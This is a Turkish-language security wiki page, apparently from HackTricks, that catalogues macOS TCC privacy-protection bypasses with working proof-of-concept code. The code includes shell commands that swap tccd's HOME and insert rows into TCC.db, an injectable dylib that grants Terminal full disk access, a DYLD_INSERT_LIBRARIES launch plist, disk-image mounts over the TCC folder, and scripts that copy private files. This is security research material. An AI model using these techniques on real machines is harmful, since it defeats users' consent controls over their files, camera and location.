# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe göre

### Write Bypass

Bu bir bypass değildir; yalnızca TCC'nin çalışma şeklidir: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop'ını okuma erişimi yoksa bile Desktop'a yazmaya devam edebilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`**, yeni **file**'a **creators app**'e onu okuma erişimi vermek için eklenir.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC prompt'unun üzerine bir pencere yerleştirmek** mümkündür. PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.** içerisinde bulabilirsiniz.<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker, **`Info.plist`** içerisinde **herhangi bir ada** (ör. Finder, Google Chrome...) sahip **apps** oluşturabilir ve bunların bazı TCC korumalı konumlara erişim istemesini sağlayabilir. Kullanıcı, bu erişimi isteyenin meşru application olduğunu düşünecektir.\
Ayrıca, meşru app'i **Dock'tan kaldırıp fake olanı Dock'a eklemek** de mümkündür. Böylece kullanıcı, aynı icon'u kullanabilen fake app'e tıkladığında fake app meşru app'i çağırabilir, TCC izinlerini isteyebilir ve bir malware çalıştırabilir; bu da kullanıcının erişimi meşru app'in istediğine inanmasını sağlar.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access"e** sahipti. Bunu devre dışı bırakmak için SSH'nin listelenmiş ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Burada bazı **malwares'lerin bu protection'ı nasıl bypass edebildiğine** dair örnekler bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> SSH'yi etkinleştirebilmek için artık **Full Disk Access** gerektiğini unutmayın.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute'u, **belirli bir application'a onu okuma izni vermek** için files'lara verilir. Bu attribute, bir file'ı bir app'in üzerine **drag\&drop** ettiğinizde veya bir user bir file'ı **default application** ile açmak için **double-click** yaptığında ayarlanır.

Bu nedenle bir user, tüm extensions'ları handle edecek **malicious app'i register** edebilir ve herhangi bir file'ı **open** etmek için Launch Services'i çağırabilir (böylece malicious file'a onu okuma erişimi verilir).<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı sayesinde, **iCloud tokens** sağlayacak **`com.apple.iCloudHelper`** XPC service'i ile iletişim kurmak mümkündür.

**iMovie** ve **Garageband** bu entitlement'a ve buna izin veren diğer entitlement'lara sahipti.

Bu entitlement'tan **icloud tokens elde etmeye** yönelik exploit hakkında daha fazla **information** için şu konuşmaya bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission'ına sahip bir app, **diğer Apps'leri kontrol edebilir**. Bu, **diğer Apps'lere verilmiş permissions'ları abuse edebileceği** anlamına gelir.<sup>[[2]](#references)</sup>

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir App'in **`iTerm` üzerinde Automation permission'ı** varsa; bu örnekte **`Terminal`**, iTerm üzerinde erişime sahiptir:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA'si olmayan Terminal, iTerm'i çağırabilir; iTerm FDA'ye sahip olduğundan Terminal, iTerm'i kullanarak actions gerçekleştirebilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Veya bir App Finder üzerinden erişime sahipse, şu şekilde bir script çalıştırabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App davranışına göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland **tccd daemon**, TCC kullanıcı veritabanına erişmek için **`HOME`** **env** değişkenini şu konumdan kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) uyarınca ve TCC daemon'ı mevcut kullanıcının domain'i içinde `launchd` aracılığıyla çalıştığı için, kendisine aktarılan **tüm environment variable** değerlerini **kontrol etmek** mümkündür.<sup>[[19]](#references)</sup>\
Böylece bir **attacker**, **`launchctl`** içindeki **`$HOME` environment** değişkenini **kontrol edilen** bir **directory**'yi gösterecek şekilde ayarlayabilir, **TCC** daemon'ını yeniden başlatabilir ve ardından son kullanıcıya hiçbir zaman prompt gösterilmeden, kendisine **mevcut her TCC entitlement'ını** vermek için **TCC database**'ini doğrudan değiştirebilir.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes, TCC tarafından korunan konumlara erişebiliyordu; ancak bir note oluşturulduğunda bu **korunmayan bir konumda oluşturulur**. Bu nedenle Notes'tan korunan bir dosyayı bir note'a (yani korunmayan bir konuma) kopyalamasını isteyebilir ve ardından dosyaya erişebilirdiniz:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` kütüphanesini kullanan `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişmek için **`kTCCServiceSystemPolicyAllFiles`** içeren `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library" konumuna quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve ardından Library'nin, Library içindeki tüm dokümanlara **erişilebilen** **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna map edilmesini sağlamak mümkündü.

### CVE-2024-44131 - FileProvider symlink race

Dosya işlemlerini **privileged helper**'a (burada **`fileproviderd`** / **`Files.app`**) devreden uygulamalar, öğeleri **kullanıcı adına** kopyalar veya taşır; bu nedenle kopyalama işlemi çağıranın değil helper'ın yetkileriyle çalışır.

Jamf Threat Labs, işlemden önce gerçekleştirilen symlink doğrulamasının **race edilebildiğini** gösterdi: symlink'i kontrol edilen yolun **son** bileşenine yerleştirmek yerine saldırgan, kopyalama işlemi başladıktan **sonra** yolun bir **ara** dizinini değiştirir. Bunun sonucunda privileged helper, saldırganın kontrol ettiği link'i takip eder ve hiçbir zaman prompt göstermeden TCC-korumalı konumları okur/yazar.<sup>[[5]](#references)</sup>

Yollarında rastgele bir UUID ile **korunmayan** dizinler (örneğin `~/Library/Mobile Documents/com~apple~CloudDocs`) en kolay hedeflerdir; çünkü saldırgan race işlemi için tam yolu öngörebilir.

> [!TIP]
> Bu, aranması gereken genel pattern'dir: **bir yolu birden fazla kez çözen herhangi bir privileged process** (check-then-use veya kaynak ve hedefi ayrı ayrı çözen `rename()`/`copyfile()`) yolun ortasındaki bir dizin değiştirilerek race edilebilir. Yalnızca `O_NOFOLLOW_ANY`, önceden açılmış bir dizin FD'si üzerinde `openat()` veya `realpath()` + yeniden doğrulama bu açığı gerçekten kapatır.

Daha fazla bilgi için [**Jamf Threat Labs yazısı**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`, environment variable'lar tarafından yönlendirilen bir logging hook ekleyen `SQLITE_ENABLE_SQLLOG` ile build edilebilir ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **açılan her database** için **database file'ın bir kopyası** ve SQL statement'larının log'u `path` içine yazılır (dizin önceden mevcut olmalıdır).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bir DB her açıldığında/attach edildiğinde mevcut dosyayı yeniden kullanmak yerine **yeni bir kopya** alınır.
- **`SQLITE_SQLLOG_CONDITIONAL`** – yalnızca ana DB'nin yanında bir `<database>-sqllog` file'ı varsa bir connection log'lanır.

Bu variable'ı **FDA** sahibi olan ve SQLite database'lerini açan bir process'e inject edebilirseniz, korunan bu database'leri kontrol ettiğiniz bir dizine memnuniyetle **copy** eder. Hedef filename saldırgan tarafından kontrol edilen verilerden türetildiği için, hedefte yerleştirilmiş bir **symlink** aynı primitive'i hedef process'in yetkileriyle **arbitrary file write** işlemine dönüştürür.

### **SQLITE_AUTO_TRACE**

`SQLITE_AUTO_TRACE` environment variable'ı set edilirse, **`libsqlite3.dylib` library'si** tüm SQL query'lerini **log'lamaya** başlar. Birçok uygulama bu library'yi kullandığından, tüm SQLite query'lerini log'lamak mümkün hale geliyordu.<sup>[[22]](#references)</sup>

Bazı Apple uygulamaları TCC-korumalı bilgilere erişmek için bu library'yi kullanıyordu.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Ortam değişkeni yönlendirmeli dosya yazma arama

Önceki iki örnek aynı genel tekniğin örnekleridir ve daha fazlasını aramak faydalıdır: **TCC ayrıcalıklı uygulamalara yüklenen framework'ler, genellikle sürecin caller-controlled bir path'te dosya oluşturmasını sağlayan debug/logging ortam değişkenlerini açığa çıkarır**.

Bunları bulmak için workflow:

1. FDA veya başka bir değerli TCC iznine sahip bir hedef seçin (`Music`, `TV`, `Terminal`, MDM agents...) ve bağlandığı framework'leri listeleyin (`otool -L`, `vmmap`).
2. Bu framework'lerde `getenv` string'lerini arayın: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Aday değişkenleri `launchctl setenv NAME /path/you/control` ile ayarlayın, uygulamayı başlatın ve `fs_usage -w -f filesys <pid>` veya `sudo fs_usage | grep <path>` ile dosya sisteminde ne yaptığını izleyin.
4. Süreç sizin dizininizde bir dosya **oluşturuyor veya yeniden adlandırıyorsa**, bir write primitive elde etmişsiniz demektir: hedefi bir symlink'e yönlendirin (veya yukarıdaki CVE-2024-44131 örneğinde olduğu gibi bir ara dizin üzerinde race gerçekleştirin) ve dosyanın `~/Library/Application Support/com.apple.TCC/TCC.db` üzerine yönlendirilmesini sağlayın.

> [!TIP]
> Bunu sınırlayan iki unsur vardır. İlk olarak, uygulama [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement'ını içermediği sürece **`DYLD_*` değişkenleri hardened-runtime binary'leri tarafından yok sayılır** ("uygulamanın dynamic linker environment variables'dan etkilenip etkilenemeyeceğini belirten ve bunları uygulamanızın sürecine code inject etmek için kullanabileceğiniz Boolean değer") — ayrıca bkz. [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). İkinci olarak Apple, bildirildikçe framework'lere ait tek tek debug değişkenlerini kaldırır; bu nedenle bir macOS sürümünde çalışan bir değişken çoğu zaman bir sonraki sürümde kaldırılmış olur. Bir değişkeni ayarladıktan sonra uygulama sessizce başlatılmayı reddederse, bu değişkeni zaten filtrelenmiş olarak değerlendirin.<sup>[[7]](#references)[[8]](#references)</sup>

Linker değişkenleriyle eşdeğer trick için [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) sayfasına bakın.

### Apple Remote Desktop

Root olarak bu servisi etkinleştirebilirdiniz ve **ARD agent'ın full disk access'i olurdu**; bu da bir user tarafından yeni bir **TCC user database** kopyalatmak için abuse edilebilirdi.

## **NFSHomeDirectory** ile

TCC, user'a özel kaynaklara erişimi kontrol etmek için user'ın HOME klasöründe **$HOME/Library/Application Support/com.apple.TCC/TCC.db** konumunda bir database kullanır.\
Bu nedenle user, `$HOME` env variable'ını **farklı bir klasörü** gösterecek şekilde ayarlayarak TCC'yi yeniden başlatmayı başarırsa, **/Library/Application Support/com.apple.TCC/TCC.db** konumunda yeni bir TCC database'i oluşturabilir ve TCC'yi herhangi bir app'e herhangi bir TCC permission vermesi için kandırabilir.

> [!TIP]
> Apple'ın `$HOME` **değeri** için user profile içinde saklanan **`NFSHomeDirectory`** attribute'unu kullandığını unutmayın; bu nedenle bu değeri değiştirme permission'larına (**`kTCCServiceSystemPolicySysAdminFiles`**) sahip bir uygulamayı compromise ederseniz, bu seçeneği bir TCC bypass ile **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, user'ın **HOME** klasörünü değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Hedef app için bir _csreq_ blob'u alın.
2. Gerekli access ve _csreq_ blob'u içeren sahte bir _TCC.db_ dosyası yerleştirin.
3. User'ın Directory Services entry'sini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile export edin.
4. User'ın home directory'sini değiştirmek için Directory Services entry'sini düzenleyin.
5. Değiştirilmiş Directory Services entry'sini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile import edin.
6. User'ın _tccd_'sini durdurun ve süreci reboot edin.

İkinci POC, `kTCCServiceSystemPolicySysAdminFiles` değerine sahip `com.apple.private.tcc.allow` entitlement'ı bulunan **`/usr/libexec/configd`** dosyasını kullandı.\
`configd`'yi **`-t`** seçeneğiyle çalıştırmak mümkündü; bir attacker **yüklenmek üzere custom bir Bundle** belirtebilirdi. Bu nedenle exploit, user'ın home directory'sini değiştiren **`dsexport`** ve **`dsimport`** yöntemlerini bir **`configd` code injection** ile **değiştirir**.

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) sayfasına bakın.<sup>[[11]](#references)</sup>

## Process injection ile

Bir sürecin içine code inject etmek ve TCC privilege'larını abuse etmek için farklı teknikler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Bununla birlikte, TCC bypass için bulunan en yaygın process injection yöntemi **plugin'ler (load library)** aracılığıyladır.\
Plugin'ler genellikle library veya plist biçimindeki ve **main application tarafından yüklenen** ek code'lardır; bunlar main application'ın context'i altında çalışır. Bu nedenle main application'ın TCC tarafından kısıtlanan dosyalara erişimi varsa (verilmiş permission'lar veya entitlement'lar aracılığıyla), **custom code da aynı erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` uygulamasında **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ı bulunuyor, `.daplug` uzantılı plugin'ler yükleniyor ve **hardened** runtime bulunmuyordu.

Bu CVE'yi weaponize etmek için, TCC bypass amacıyla user'ların TCC database'ini **ele geçirebilmek** üzere (önceki entitlement abuse edilerek) **`NFSHomeDirectory`** **değiştirilir**.

Daha fazla bilgi için [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) sayfasına bakın.<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary'sinde `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'ları bulunuyordu. İlki **code injection'a izin veriyor**, ikincisi ise binary'ye **TCC'yi yönetme erişimi** sağlıyordu.

Bu binary, `/Library/Audio/Plug-Ins/HAL` klasöründen **third party plug-in'ler** yüklemeye izin veriyordu. Bu nedenle şu PoC ile bir **plugin yüklemek ve TCC permission'larını abuse etmek** mümkündü:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O üzerinden kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`** kullanan uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan bu plugin'leri (SIP tarafından kısıtlanmamış) işlem içinde yükler.

Oraya yalnızca yaygın **constructor** içeren bir library yerleştirmek **code inject** etmek için yeterlidir.

Birkaç Apple uygulaması buna karşı savunmasızdı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` entitlements'ları bulunuyordu:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Bu konunun nasıl kolayca exploit edilebileceği hakkında daha fazla bilgi için [**orijinal raporu inceleyin**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'si **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlement'larına sahipti; bu da process içine code inject edilmesine ve TCC privileges kullanılmasına olanak tanıyordu.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlement'larına sahipti; bu nedenle, kamera ile kayıt yapmak gibi **permissions'larına erişim sağlamak** için abuse edilmesi mümkündü. [**Payload'ı writeup içinde bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Bir library yüklemek için env variable'ın nasıl kullanıldığına dikkat edin: bu library'yi inject etmek üzere **custom plist** oluşturuldu ve bunu başlatmak için **`launchctl`** kullanıldı:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open invocations ile

**`open`** komutunu sandboxed durumdayken bile çağırmak mümkündür.

### Terminal Script'leri

En azından teknik kişiler tarafından kullanılan bilgisayarlarda Terminal'e **Full Disk Access (FDA)** vermek oldukça yaygındır. Bu erişimle **`.terminal`** script'lerini çağırmak da mümkündür.

**`.terminal`** script'leri, çalıştırılacak komutun **`CommandString`** anahtarında bulunduğu aşağıdaki gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konuma bir terminal script'i yazabilir ve bunu şu tür bir komutla başlatabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mount ederek

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir kullanıcı** (unprivileged kullanıcılar dahi) bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gereken **tek privilege**, kullanılan uygulamanın (örneğin `Terminal`) bir admin tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCC dosyası üzerine mount etme

TCC DB dosyası korumalı olsa bile, **dizinin üzerine** yeni bir TCC.db dosyası mount etmek mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
[**orijinal writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) içindeki **tam exploit**'i inceleyin.<sup>[[21]](#references)</sup>

### CVE-2024-40855

[orijinal writeup'ta](https://www.kandji.io/blog/macos-audit-story-part2) açıklandığı üzere, bu CVE `diskarbitrationd`'yi kötüye kullanıyordu.<sup>[[16]](#references)</sup>

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` işlevi security kontrollerini gerçekleştiriyordu. Ancak `diskarbitrationd`'yi doğrudan çağırarak bu kontrolleri bypass etmek ve bu nedenle path içinde `../` öğeleri ile symlink'ler kullanmak mümkündü.

Bu durum, `diskarbitrationd`'nin `com.apple.private.security.storage-exempt.heritable` entitlement'ı sayesinde TCC database'inin üzerine mount etmek de dahil olmak üzere, bir saldırganın herhangi bir konuma arbitrary mount gerçekleştirmesine olanak tanıyordu.

### asr

**`/usr/sbin/asr`** aracı, TCC protections'ı bypass ederek diskin tamamını kopyalamaya ve başka bir konuma mount etmeye olanak tanıyordu.

### CVE-2022-22655 - Location Services

Location Services, diğer servisler gibi bir TCC database'inde **saklanmaz**. Kendi allow-list'ini **`/var/db/locationd/clients.plist`** içinde tutan `locationd` tarafından yönetilir:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Her kayıt istemciye (bundle ID veya executable path) göre anahtarlanır ve `Authorized`, `BundleId`, `Executable` ve `Registered` gibi alanlar içerir.<sup>[[4]](#references)</sup>

`clients.plist` dosyasının kendisi Sandbox/TCC tarafından korunur ve root olarak bile düzenlenemez — ancak **`/var/db/locationd/` dizini mount edilmekten korunmuyordu**. Bu nedenle root olarak çalışan bir attacker, kendi `clients.plist` dosyasını içeren bir disk image oluşturabilir (binary dosyasını `Authorized` olarak işaretleyerek), bunu dizinin üzerine mount edebilir ve forged allow-list'in etkin olması için `locationd`'yi yeniden başlatabilirdi.<sup>[[3]](#references)</sup>

> [!TIP]
> Bu, yukarıdaki `hdiutil`/`mount` TCC bypass'leriyle aynı modeldir: *dosya* korunur, dosyanın bulunduğu *dizin* korunmaz; bu nedenle dosya yerine tüm dizini değiştirirsiniz.

## Startup apps üzerinden


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep üzerinden

Bazı durumlarda dosyalar; e-posta adresleri, telefon numaraları, mesajlar... gibi hassas bilgileri korumasız konumlarda saklar (Apple açısından bunlar vulnerability olarak değerlendirilir).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanmanın başka bir yolu:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
